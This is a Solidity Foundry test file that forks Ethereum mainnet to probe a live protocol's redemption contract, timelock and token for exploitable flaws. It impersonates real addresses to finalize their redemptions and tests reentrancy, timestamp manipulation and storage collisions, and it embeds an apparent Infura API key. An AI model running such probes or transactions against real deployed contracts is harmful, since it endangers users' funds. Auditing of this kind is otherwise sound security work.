// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface ITimelockController {
    function getMinDelay() external view returns (uint256);
    function isOperation(bytes32 id) external view returns (bool);
    function isOperationPending(bytes32 id) external view returns (bool);
    function isOperationReady(bytes32 id) external view returns (bool);
    function isOperationDone(bytes32 id) external view returns (bool);
    function getTimestamp(bytes32 id) external view returns (uint256);
    function execute(address target, uint256 value, bytes calldata payload, bytes32 predecessor, bytes32 salt) external payable;
    function executeBatch(address[] calldata targets, uint256[] calldata values, bytes[] calldata payloads, bytes32 predecessor, bytes32 salt) external payable;
    function hasRole(bytes32 role, address account) external view returns (bool);
    function EXECUTOR_ROLE() external view returns (bytes32);
    function PROPOSER_ROLE() external view returns (bytes32);
    function CANCELLER_ROLE() external view returns (bytes32);
}

/**
 * Check for any pending timelock operations that might be ready to execute
 * Also explore if there are mature redemptions on mainnet we can exploit
 */
contract TimelockPendingOps is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
    }

    function test_CheckTimelockState() public view {
        console.log("=== TIMELOCK STATE CHECK ===\n");

        ITimelockController timelock = ITimelockController(TIMELOCK);

        uint256 minDelay = timelock.getMinDelay();
        console.log("Min delay:", minDelay, "seconds");
        console.log("Min delay:", minDelay / 86400, "days");

        bytes32 executorRole = timelock.EXECUTOR_ROLE();
        bytes32 proposerRole = timelock.PROPOSER_ROLE();

        console.log("\nExecutor role:");
        console.logBytes32(executorRole);

        // Check if address(0) has executor role (open executor)
        bool openExecutor = timelock.hasRole(executorRole, address(0));
        console.log("Open executor (anyone can execute):", openExecutor);

        // Check if attacker can be executor
        bool attackerCanExecute = timelock.hasRole(executorRole, attacker);
        console.log("Attacker has executor role:", attackerCanExecute);
    }

    function test_ScanForPendingOperations() public view {
        console.log("=== SCANNING TIMELOCK PENDING OPS ===\n");

        ITimelockController timelock = ITimelockController(TIMELOCK);

        // Compute operation IDs for interesting targets
        // Try to find any pending setDelay operations

        // Check some known operation patterns
        bytes32[] memory possibleOps = new bytes32[](10);

        // Common patterns - these would be operation IDs
        // We need to search logs, but for now check some possible values

        // Try to find operations by checking storage directly
        console.log("Checking timelock storage for pending operations...\n");

        // TimelockController stores timestamps at keccak256(id) in a mapping
        // _timestamps mapping is at slot 2 (after AccessControl's slots)

        // Check a few blocks of storage
        for (uint256 i = 0; i < 20; i++) {
            bytes32 slot = bytes32(i);
            bytes32 value = vm.load(TIMELOCK, slot);
            if (uint256(value) > 0 && uint256(value) < type(uint256).max) {
                console.log("Slot", i, "has value:");
                console.logBytes32(value);
            }
        }
    }

    function test_CheckExistingRedemptions() public view {
        console.log("=== CHECKING EXISTING REDEMPTIONS ===\n");

        // Look for existing redemptions that might be mature
        // The redemption mapping is at slot 5: mapping(address => Redemption[])

        console.log("Current block timestamp:", block.timestamp);

        // Check some known addresses that might have redemptions
        address[] memory checkAddrs = new address[](5);
        checkAddrs[0] = 0xd3E4C3552a3eEdA56c7A1d86768E67f7dcB2f25E; // Safe
        checkAddrs[1] = TIMELOCK;
        checkAddrs[2] = VAULT;
        checkAddrs[3] = R0;
        checkAddrs[4] = 0x0000000000000000000000000000000000000001;

        for (uint256 i = 0; i < checkAddrs.length; i++) {
            bytes32 arrayLengthSlot = keccak256(abi.encode(checkAddrs[i], uint256(5)));
            uint256 length = uint256(vm.load(R0, arrayLengthSlot));

            if (length > 0) {
                console.log("Found redemptions for:", checkAddrs[i]);
                console.log("Redemption count:", length);

                bytes32 baseSlot = keccak256(abi.encode(arrayLengthSlot));

                for (uint256 j = 0; j < length && j < 3; j++) {
                    bytes32 redeemSlot0 = vm.load(R0, bytes32(uint256(baseSlot) + j * 2));

                    uint96 maturity = uint96(uint256(redeemSlot0));
                    uint96 amount = uint96(uint256(redeemSlot0) >> 96);

                    console.log("  Redemption", j, ":");
                    console.log("    Maturity:", maturity);
                    console.log("    Amount:", uint256(amount) / 1e18);
                    console.log("    Is mature:", block.timestamp >= maturity);
                }
            }
        }
    }

    function test_FindMatureRedemptionsAnywhere() public {
        console.log("=== BRUTE FORCE SEARCH FOR MATURE REDEMPTIONS ===\n");

        // Query recent events to find addresses with redemptions
        // Look at Transfer events to TASSET from R0

        console.log("Current timestamp:", block.timestamp);

        // Check well-known addresses
        address[20] memory wellKnown = [
            0xd3E4C3552a3eEdA56c7A1d86768E67f7dcB2f25E, // Safe
            TIMELOCK,
            0x0000000000000000000000000000000000000001,
            0x0000000000000000000000000000000000000002,
            0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF,
            0x1111111111111111111111111111111111111111,
            0x2222222222222222222222222222222222222222,
            0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
            0x000000000000000000000000000000000000dEaD,
            0xdEad000000000000000000000000000000000000,
            // Some common depositor addresses from Etherscan
            0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, // Hardhat default
            0x70997970C51812dc3A010C7d01b50e0d17dc79C8,
            0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC,
            0x90F79bf6EB2c4f870365E785982E1f101E93b906,
            0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65,
            0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc,
            0x976EA74026E726554dB657fA54763abd0C3a0aa9,
            0x14dC79964da2C08b23698B3D3cc7Ca32193d9955,
            0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f,
            0xa0Ee7A142d267C1f36714E4a8F75612F20a79720
        ];

        uint256 foundCount = 0;

        for (uint256 i = 0; i < wellKnown.length; i++) {
            bytes32 arrayLengthSlot = keccak256(abi.encode(wellKnown[i], uint256(5)));
            uint256 length = uint256(vm.load(R0, arrayLengthSlot));

            if (length > 0) {
                console.log("\n*** FOUND REDEMPTIONS ***");
                console.log("Address:", wellKnown[i]);
                console.log("Count:", length);
                foundCount++;

                bytes32 baseSlot = keccak256(abi.encode(arrayLengthSlot));

                for (uint256 j = 0; j < length && j < 5; j++) {
                    bytes32 redeemSlot0 = vm.load(R0, bytes32(uint256(baseSlot) + j * 2));

                    uint96 maturity = uint96(uint256(redeemSlot0));
                    uint96 amount = uint96(uint256(redeemSlot0) >> 96);

                    if (block.timestamp >= maturity && amount > 0) {
                        console.log("  *** MATURE REDEMPTION FOUND! ***");
                        console.log("    Index:", j);
                        console.log("    Amount:", uint256(amount) / 1e18, "TASSET");

                        // Try to finalize it
                        vm.startPrank(wellKnown[i]);
                        (bool success, ) = R0.call(
                            abi.encodeWithSignature("finalizeRedeem(uint256)", j)
                        );
                        vm.stopPrank();

                        console.log("    Finalize attempt:", success);
                    }
                }
            }
        }

        console.log("\nTotal addresses with redemptions found:", foundCount);
    }

    function test_ExploitMaturityTimestampManipulation() public {
        console.log("=== MATURITY TIMESTAMP MANIPULATION ===\n");

        // The redemption struct is:
        // struct Redemption {
        //     uint96 maturity;    // slot 0, bits 0-95
        //     uint96 amount;      // slot 0, bits 96-191
        //     address recipient;  // slot 1
        // }

        // Can we manipulate the maturity via struct packing?
        // The struct is stored in a dynamic array

        vm.deal(attacker, 100 ether);
        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Create a redemption
        console.log("Creating redemption...");
        (bool success, ) = R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("Redeem success:", success);

        vm.stopPrank();

        if (!success) return;

        // Check the redemption struct
        bytes32 arrayLengthSlot = keccak256(abi.encode(attacker, uint256(5)));
        uint256 length = uint256(vm.load(R0, arrayLengthSlot));
        console.log("Redemption count:", length);

        bytes32 baseSlot = keccak256(abi.encode(arrayLengthSlot));
        bytes32 redeemSlot0 = vm.load(R0, baseSlot);

        console.log("\nRedemption slot 0:");
        console.logBytes32(redeemSlot0);

        uint96 maturity = uint96(uint256(redeemSlot0));
        uint96 amount = uint96(uint256(redeemSlot0) >> 96);

        console.log("Maturity:", maturity);
        console.log("Current:", block.timestamp);
        console.log("Difference:", maturity - block.timestamp, "seconds");
        console.log("Amount:", uint256(amount) / 1e18);

        // Check if there's any way to modify this via callback
        // The redeem function burns TASSET and creates the struct
        // Is there any callback we can exploit?

        console.log("\n--- Checking for callbacks during redeem ---");

        // TASSET is ERC20 - check if it has any transfer hooks
        bytes memory tassetCode = address(TASSET).code;
        console.log("TASSET code size:", tassetCode.length);

        // Check for ERC777 hooks signature
        bytes4 tokensReceivedSig = bytes4(keccak256("tokensReceived(address,address,address,uint256,bytes,bytes)"));
        bytes4 tokensToSendSig = bytes4(keccak256("tokensToSend(address,address,address,uint256,bytes,bytes)"));

        // Search for these selectors in bytecode
        bool hasTokensReceived = false;
        bool hasTokensToSend = false;

        for (uint256 i = 0; i + 4 < tassetCode.length; i++) {
            bytes4 selector = bytes4(tassetCode[i]) |
                             (bytes4(tassetCode[i+1]) >> 8) |
                             (bytes4(tassetCode[i+2]) >> 16) |
                             (bytes4(tassetCode[i+3]) >> 24);

            if (selector == tokensReceivedSig) hasTokensReceived = true;
            if (selector == tokensToSendSig) hasTokensToSend = true;
        }

        console.log("Has tokensReceived:", hasTokensReceived);
        console.log("Has tokensToSend:", hasTokensToSend);
    }

    function test_CheckCallbackDuringRedeem() public {
        console.log("=== CALLBACK EXPLOITATION ===\n");

        // Deploy a contract that receives callbacks and tries to manipulate state

        // The redeem flow:
        // 1. R0.redeem(amount)
        // 2. R0 delegatecalls to RC
        // 3. RC burns TASSET from msg.sender (which is original caller)
        // 4. RC creates redemption struct

        // TASSET.burn uses transferFrom pattern, but is there a callback?
        // Check if TASSET has any hook mechanism

        console.log("TASSET address:", TASSET);

        // Check TASSET implementation
        bytes32 implSlot = bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc));
        address tassetImpl = address(uint160(uint256(vm.load(TASSET, implSlot))));
        console.log("TASSET implementation:", tassetImpl);

        // Check if TASSET inherits from ERC777
        (bool has777, ) = TASSET.staticcall(abi.encodeWithSignature("granularity()"));
        console.log("Has ERC777 granularity:", has777);

        // Check for _callTokensToSend, _callTokensReceived
        (bool hasDefaultOps, ) = TASSET.staticcall(abi.encodeWithSignature("defaultOperators()"));
        console.log("Has defaultOperators:", hasDefaultOps);
    }

    function test_StorageLayoutExploit() public {
        console.log("=== STORAGE LAYOUT EXPLOIT ===\n");

        // Check if there's storage collision between delay and redemptions

        // Delay is at slot 4, bits 96-127
        // Redemptions mapping is at slot 5

        // What if we can create a redemption that overwrites something?

        // Array length for address X is at: keccak256(X, 5)
        // First element is at: keccak256(keccak256(X, 5))

        // Can we make keccak256(X, 5) = 4 (the delay slot)?
        // This would require finding X such that keccak256(X, 5) = 4
        // This is infeasible (would need to break keccak256)

        console.log("Checking storage layout...");

        bytes32 slot4 = vm.load(R0, bytes32(uint256(4)));
        console.log("Slot 4 (contains delay):");
        console.logBytes32(slot4);

        bytes32 slot5 = vm.load(R0, bytes32(uint256(5)));
        console.log("Slot 5 (redemptions mapping base):");
        console.logBytes32(slot5);

        // Check if any redemption struct position could collide
        // with slot 4

        // For collision, we need: keccak256(keccak256(addr, 5)) + offset = 4
        // This requires keccak256(keccak256(addr, 5)) to be very close to 4 or wrap around

        // Since keccak256 output is 256 bits, probability of hitting any specific slot
        // is astronomically low (1/2^256)

        console.log("\nStorage collision is computationally infeasible");
    }

    function test_CrossContractReentrance() public {
        console.log("=== CROSS-CONTRACT REENTRANCY ===\n");

        // Check if we can use reentrancy during the redeem flow
        // to manipulate state

        // The flow:
        // R0.redeem -> delegatecall RC -> TASSET.burn -> potential callback?

        // If TASSET calls back during burn, can we:
        // 1. Modify the redemption struct?
        // 2. Finalize the redemption before it's created?
        // 3. Modify the delay?

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Check balance before
        uint256 wstethBefore = IERC20(wstETH).balanceOf(attacker);
        console.log("wstETH before:", wstethBefore);

        // Create redemption
        (bool success,) = R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("Redeem success:", success);

        if (!success) {
            vm.stopPrank();
            return;
        }

        // Check if there's any way to finalize immediately
        (bool finSuccess, bytes memory finData) = R0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("Immediate finalize success:", finSuccess);

        if (!finSuccess && finData.length > 4) {
            bytes4 errorSig = bytes4(finData);
            console.log("Error signature:");
            console.logBytes4(errorSig);
        }

        vm.stopPrank();

        uint256 wstethAfter = IERC20(wstETH).balanceOf(attacker);
        console.log("wstETH after:", wstethAfter);
        console.log("Gained:", wstethAfter - wstethBefore);
    }
}
